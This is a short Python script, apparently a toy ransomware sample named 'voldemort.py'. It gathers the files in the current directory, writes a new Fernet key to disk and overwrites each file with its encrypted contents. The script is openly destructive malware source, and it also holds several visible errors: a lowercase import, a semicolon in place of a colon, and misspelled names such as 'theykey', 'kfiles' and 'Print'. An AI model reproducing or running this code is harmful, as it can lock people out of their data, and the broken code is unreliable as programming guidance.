#!/usr/bin/env python3

import os
from cryptography.fernet import fernet

#let's find some files


files = []

for file in os.listdir();
        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)


key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey: 
        theykey.write(key)

for file in kfiles:
        with open(file, "rb") as thefile:
                contents= thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)


Print("Files are encrypted")